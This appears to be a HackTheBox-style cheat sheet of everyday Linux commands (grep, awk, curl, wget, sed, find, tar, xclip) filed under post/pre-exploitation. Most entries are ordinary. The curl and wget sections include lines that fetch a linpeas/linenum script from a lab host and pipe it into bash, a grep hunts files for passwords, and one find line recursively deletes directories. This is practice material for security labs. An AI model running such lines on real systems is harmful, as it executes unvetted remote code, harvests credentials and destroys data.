### Post \ Pre Exploitation

- [ls](https://github.com/cyberwr3nch/hackthebox/blob/master/notes/commands/Regular%20Commands.md#ls)
- [Grep](https://github.com/cyberwr3nch/hackthebox/blob/master/notes/commands/Regular%20Commands.md#grep)
- [AWK](https://github.com/cyberwr3nch/hackthebox/blob/master/notes/commands/Regular%20Commands.md#awk)
- [Curl](https://github.com/cyberwr3nch/hackthebox/blob/master/notes/commands/Regular%20Commands.md#curl)
- [wget](https://github.com/cyberwr3nch/hackthebox/blob/master/notes/commands/Regular%20Commands.md#wget)
- [Compression and decompression of files](https://github.com/cyberwr3nch/hackthebox/blob/master/notes/commands/Regular%20Commands.md#compressing-and-decompressing)
- [Find](https://github.com/cyberwr3nch/hackthebox/blob/master/notes/commands/Regular%20Commands.md#find)
- [xclip](https://github.com/cyberwr3nch/hackthebox/blob/master/notes/commands/Regular%20Commands.md#xclip)
- [Misc](https://github.com/cyberwr3nch/hackthebox/blob/master/notes/commands/Regular%20Commands.md#misc)
- [bashLoops](https://github.com/cyberwr3nch/hackthebox/blob/master/notes/commands/Regular%20Commands.md#bash-loops)
- [sed](https://github.com/cyberwr3nch/hackthebox/blob/master/notes/commands/Regular%20Commands.md#sed)
- [tr](https://github.com/cyberwr3nch/hackthebox/blob/master/notes/commands/Regular%20Commands.md#tr)


#### ls
```bash
# list files
ls

# list hidden files
ls -la

# list files with human readable size
la -sh
```

#### Grep
```bash
# search for the files that contains the phrase password in it
grep -ir password
grep -iRl "password" ./

# exclude multiple strings
grep -Ev 'exclude1 | exclude 2' filename.txt

# obtain only lines starting with small letters
grep -v '[A-Z]' users.txt
```


#### AWK
```bash
# simple grab based on spaces, damnedsec cyberwr3nch hackthebox
awk '{print $1}' # output damnedsec

# multiple field seperator, obtain things only with in the delimeter
# contents of the file-> user: cyberwr3nch: damnedsec;123
awk -F: '{print $3}' users.txt # output damnedsec;123

# contents of users.txt -> user:[BLACKFIELD764430] rid:[0x451], 
awk -F"[][]" '{print $2}' users.txt # output: BLACKFIELD764430

# obtain contents from a specific line
# where x is the line number	
awk 'NR==x {print $1}'

# print lines form a specific line to the end of the file
awk 'NR>x' users.txt

```

#### Curl
```bash
# make http, http2, http3 requests with curl
curl -vv http://10.10.10.10
curl --http2 http://10.10.10.10
curl --http3 http://10.10.10.10

# obtain only the response header
curl --head http://10.10.10.10.

# upload files via curl
curl --user "{user}:{creds}" --upload-file=<file> "http://10.10.10.10/upload_location"

# curl save the output
curl http://10.10.10.10 -o index.html

# pipe the requesting files
curl http://10.10.10.10:<port_no>:lin(peas\|enum).sh | bash
```

#### Wget
```bash
# download files with wget
wget http://10.10.10.10/xxx.sh

# run files without downloading
wget -O - http://10.10.10.11:<port_no>:lin(peas\|enum).sh
```

#### SED
```bash
# search and replace strings
cat username.txt | sed s/{stringToBeChanged}/{replacementString}/g

# replace the last ',' with a null character
cat usernames.txt | sed s/,$//

# add \x after every two characters, the .. denotes the two characters, \x&, adds \x and & doesnt delete the characters that were before
cat hexpayload.txt | sed 's/../\\x&/g'
```

#### tr
```bash
# translate new lines '\n' into ','; used in HTB nmap
cat usernames.txt | tr '\n' ','
```


#### Find
```bash
# find with file names
find . -name user.txt 

# find and execute
find . -name '*.txt' -exec cat "{}" \;

# {} is used as the place holder and tells the follwing to as an argument
# find directories with the specified name and execute the command
find . -type d -name uploads -exec rm -rf "{}" ';'

# find and copy files 
find -name 'file.ext' -exec cp "{}" <copy_path>  \;

# find the recently modified files
# maxdepth - sub directories, newermt - timestamp
find . -maxdepth 1 -newermt "2016-12-06"

# find files with specific string in it
find . -type f -print0 | xargs -0 -e grep -niH -e "your common word to search"
```

#### Compressing and Decompressing
```bash
# zip a folder with its contents
zip -r -9 html.zip /var/www/html

# unzip a zip file
unzip html.zip

# tar a file
tar cvf html.tar html/

# extract a .tar file
tar -xvf html.tar 

# tar.gz a folder
tar cvfz html.tar.gz html/

# unzip a *.tar.gz file
tar -xzvf html.tar.gz

# unzip rar file
unrar x html.rar
```

#### Xclip
```bash
# installation
sudo apt-get install xclip

# copying contents from a file and pasting it with 'mouse scroll button'
cat user.txt | xclip

# copying file and using cttl + v for pasting
cat user.txt | xclip -sel clip
cat user.txt | xclip -selection clipboard

# copy the contents in the primary clipboard
cat user.txt | xclip -selection primary
```

#### Misc
```bash
# monitor, repeat the same command for a period of time
# ls -la every 1 sec on a dir
watch -n 1 'ls -la'
```

#### Bash Loops
```bash
# for loop that adds payload += in each line of the file
for i in $(cat hexdata); do echo "payload += b'$i'"; done
```
